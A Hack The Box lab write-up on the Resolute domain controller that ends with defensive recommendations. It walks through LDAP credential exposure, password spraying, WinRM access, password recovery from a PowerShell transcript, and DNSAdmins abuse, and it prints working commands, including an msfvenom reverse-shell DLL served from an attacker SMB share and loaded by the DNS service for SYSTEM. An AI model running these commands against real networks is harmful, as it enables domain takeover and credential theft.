---
title: "Resolute — LDAP Credential Exposure and DNSAdmins DLL Injection to SYSTEM"
description: "An LDAP description attribute and PowerShell transcripts expose administrative credentials, then DNSAdmins abuse loads a malicious DLL for SYSTEM."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - credential-exposure
  - dnsadmins
objective: "Escalate from unauthenticated LDAP enumeration to SYSTEM on a domain controller by abusing exposed credentials and DNSAdmins plugin-DLL loading."
tools:
  - enum4linux
  - NetExec
  - evil-winrm
  - BloodHound
  - msfvenom
  - impacket-smbserver
  - dnscmd
  - sc.exe
  - netcat
skill: "Credential-exposure discovery and Active Directory privilege escalation through DNSAdmins group abuse"
outcome: "Authenticated WinRM access as a domain user and SYSTEM-level command execution on the domain controller"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Server 2019 Active Directory domain controller |
| Starting position | Unauthenticated network access |
| Objective | Escalate from unauthenticated LDAP enumeration to SYSTEM on a domain controller by abusing exposed credentials and DNSAdmins plugin-DLL loading |
| Outcome | Authenticated WinRM access as a domain user; SYSTEM-level command execution on the domain controller |

## LDAP leak to DNS plugin DLL

Resolute is a Medium-rated Hack The Box Windows Active Directory lab on a Server 2019 domain controller. The path reaches SYSTEM through two credential-exposure classes and an over-privileged group, without exploiting a software CVE. Anonymous SMB/LDAP enumeration exposes an onboarding password in a user's `description` attribute; spraying that default against all domain accounts yields an authenticated WinRM foothold. A PowerShell transcript left on disk then discloses an administrative account's password, whose group path through `CONTRACTORS` into `DNSADMINS` allows a server-level plugin DLL to be loaded by the SYSTEM-run DNS service. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Unauthenticated SMB/LDAP enumeration → description-field password exposure → password spraying → WinRM foothold → PowerShell transcript credential recovery → BloodHound group mapping → DNSAdmins plugin DLL → SYSTEM**

## Server 2019 controller with anonymous LDAP, no credentials

- **Target:** a Windows Server 2019 domain controller hosting Active Directory for the `<DOMAIN>` domain; standard AD services plus WinRM (5985) and DNS (53).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from anonymous SMB/LDAP enumeration to SYSTEM on the domain controller by combining exposed credentials, a stored session artifact, and an over-privileged group.
- **Constraints:** activity stayed inside the Hack The Box lab environment.

## Evidence: LDAP leak to transcript to DNS plugin

### 1. LDAP Enumeration and Credential Discovery

Observation: anonymous SMB/LDAP enumeration of the domain controller returned domain users and their attributes, and one provisioning account carried an initial password in its `description` field.

Action:

```bash
enum4linux -a <TARGET_IP> 2>/dev/null | tee enum4linux.out
```

Truncated output:

```text
user:[<PROVISION_ACCOUNT>]
  Account: <PROVISION_ACCOUNT>   Name: <PROVISION_NAME>   Desc: Account created. Password set to <DEFAULT_PASSWORD>
```

Significance: the `description` (and `info`) attribute is readable by any account that can enumerate the directory, here without authentication, so a documented onboarding password becomes a candidate credential for every account provisioned the same way.

Result: an initial onboarding password is exposed for `<PROVISION_ACCOUNT>`.

### 2. Password Spraying

Observation: I tried the leaked default across the full set of enumerated domain accounts, because accounts sharing the provisioning pattern may never have changed it.

Action:

```bash
enum4linux -U <TARGET_IP> 2>/dev/null | grep "user:" | awk -F: '{print $2}' | tr -d '[]' > users.txt
nxc smb <DOMAIN> -u users.txt -p '<DEFAULT_PASSWORD>' --continue-on-success
```

Truncated output:

```text
[+] <DOMAIN>\<USER_2>:<DEFAULT_PASSWORD>
```

Significance: this is horizontal credential reuse rather than a password-strength attack: one provisioned default is matched against many accounts, and a single hit yields valid domain credentials.

Result: `<USER_2>` retained the default onboarding password, and authentication succeeds, giving an authenticated foothold.

### 3. WinRM Initial Access

Observation: the recovered credential also authorizes WinRM, an interactive remote-shell service exposed on the domain controller.

Action:

```bash
nxc winrm <DOMAIN> -u '<USER_2>' -p '<DEFAULT_PASSWORD>'
evil-winrm -i <TARGET_IP> -u '<USER_2>' -p '<DEFAULT_PASSWORD>'
```

Truncated output:

```text
[+] <DOMAIN>\<USER_2>:<DEFAULT_PASSWORD> (Pwn3d!)
```

Significance: the `(Pwn3d!)` marker shows the account can obtain an administrative WinRM session, so the exposed service turns a leaked default into an interactive shell without any exploit.

Result: an authenticated WinRM shell as `<USER_2>` is established on the domain controller.

### 4. PowerShell Transcript Credential Recovery

Observation: post-exploitation file enumeration found a PowerShell transcription directory holding a transcript from an earlier session.

Action:

```powershell
Get-ChildItem -Path C:\ -Force -Recurse -ErrorAction SilentlyContinue |
  Where-Object {$_.Name -like "PSTranscripts" -or $_.Name -like "*history*"} 2>$null
```

Truncated output:

```text
C:\PSTranscripts\<TIMESTAMP>\<TRANSCRIPT_FILE>
```

The transcript records an administrative `net use` command with its password as a command-line argument:

```text
*> net use X: \\<FILE_SERVER_HOST>\backups <USER_3> <USER_3_PASSWORD>

**********************
Windows PowerShell transcript start
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\<FILE_SERVER_HOST>\backups <USER_3> <USER_3_PASSWORD>"
```

The recovered credential is then validated through SMB:

```bash
nxc smb <DOMAIN> -u '<USER_3>' -p '<USER_3_PASSWORD>'
```

Truncated output:

```text
[+] <DOMAIN>\<USER_3>:<USER_3_PASSWORD> (Pwn3d!)
```

Significance: interactive PowerShell transcription logs each command line verbatim, so a credential passed as an argument to `net use` is stored in cleartext on disk; the subsequent SMB authentication confirms the credential and shows the account holds administrative rights.

Result: the transcript exposes `<USER_3>`'s password, which once validated through SMB provides administrative access.

### 5. BloodHound Group Mapping

Observation: directory collection maps the group relationships that the recovered administrative account inherits.

Action:

```bash
bloodhound-ce-python -d <DOMAIN> -u '<USER_3>' -p '<USER_3_PASSWORD>' -c all -ns <TARGET_IP>
```

The source records that `<USER_3>` is a member of `CONTRACTORS`, which is nested into `DNSADMINS`; I could not verify the nesting from captured output.

Significance: the account inherits DNS administration rights through group nesting rather than through any explicit grant on the account, and that group holds a documented privilege-escalation capability.

Result: the account follows a group path that reaches the DNS administration privilege.

### 6. DNSAdmins Plugin DLL to SYSTEM

Observation: the `DNSAdmins` group can point the DNS service at a server-level plugin DLL that the service loads on restart, and the DNS service runs as `NT AUTHORITY\SYSTEM`, so any loaded DLL executes at SYSTEM privilege.

Action: generate the DLL and host it on an SMB share:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o <PAYLOAD_DLL>
sudo impacket-smbserver share . -smb2support
```

Action: as `<USER_3>` over WinRM, register the plugin path and restart the service:

```cmd
dnscmd localhost /config /serverlevelplugindll \\<ATTACKER_IP>\share\<PAYLOAD_DLL>
sc.exe stop dns
sc.exe start dns
```

Action: catch the callback:

```bash
nc -lvnp <PORT>
```

Truncated output:

```text
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] <SOURCE_PORT>
Microsoft Windows [Version 10.0.17763.1490]
C:\Windows\system32>whoami
nt authority\system
```

Significance: `dnscmd` lets a `DNSAdmins` member register a plugin DLL that a SYSTEM service loads from a UNC path, so group membership becomes arbitrary code execution as SYSTEM once the service restarts: a documented design capability, not a memory-corruption exploit.

Result: the callback returns and `whoami` confirms `nt authority\system`, establishing SYSTEM-level command execution on the domain controller.

## The rotated provisioning default

| Challenge | Decision | Rationale |
|---|---|---|
| Direct authentication with the leaked default for `<PROVISION_ACCOUNT>` failed because that account's password had been rotated | Sprayed the default across all enumerated accounts instead | The provisioning pattern indicated other accounts might still hold the initial password |

## Outcome: WinRM user and SYSTEM via DNS plugin

The recorded path reaches authenticated WinRM access as `<USER_2>`, an administrative credential for `<USER_3>` recovered from a PowerShell transcript and then validated through SMB, and SYSTEM-level command execution on the domain controller via a DNS service plugin DLL. Limitation: credential, host, and transfer values are redacted, so the recovered secrets are not reproducible from this writeup.

## Recommendations: LDAP attributes, default rotation, transcripts, and DNSAdmins

The evidence supports the controls below; this exercise did not verify their operation.

1. **Credentials documented in LDAP attributes.** The `description` attribute exposed `<PROVISION_ACCOUNT>`'s initial password to unauthenticated enumeration. *Recommendation:* never store credentials in `description`/`info` attributes, deliver initial credentials out-of-band, and force a change at first logon. *Detection:* scan directory attributes for credential-shaped strings and flag anonymous LDAP enumeration.
2. **Onboarding default not rotated.** `<USER_2>` retained the shared provisioning password, so one spray attempt produced an authenticated foothold. *Recommendation:* enforce mandatory first-logon rotation, verify completion, and disallow shared defaults. *Detection:* monitor repeated authentication attempts using the same password across many accounts.
3. **PowerShell transcription capturing cleartext secrets.** An interactive transcript logged a `net use` command with `<USER_3>`'s password as an argument. *Recommendation:* avoid passing secrets on command lines (use `Get-Credential`/credential objects), keep transcript storage write-only for users and readable only by central logging, and prefer `ScriptBlock` logging. *Detection:* mine the transcript store for credential patterns and monitor access to `C:\PSTranscripts`.
4. **Over-privileged DNSAdmins group.** `DNSAdmins` membership allowed a server-level plugin DLL to be loaded and executed by the SYSTEM-run DNS service. *Recommendation:* treat `DNSAdmins` as a tier-zero group, limit it to dedicated DNS administration accounts, and monitor the `ServerLevelPluginDll` registry value under `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`. *Detection:* monitor changes to that registry value and on DNS service restarts following a plugin-path change.

## References

- [Hack The Box — Resolute](https://app.hackthebox.com/machines/Resolute) (retired machine)
- [dnscmd — Windows Commands (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) (documents `/config /serverlevelplugindll`, the server-level plugin path loaded by the DNS service)
- [Start-Transcript (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-5.1) (PowerShell session transcription recording command lines)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and WinRM operations used for spraying and authentication checks)
- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) (SMB/LDAP enumeration)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
- [Impacket (`impacket-smbserver`)](https://github.com/fortra/impacket) (SMB share hosting)
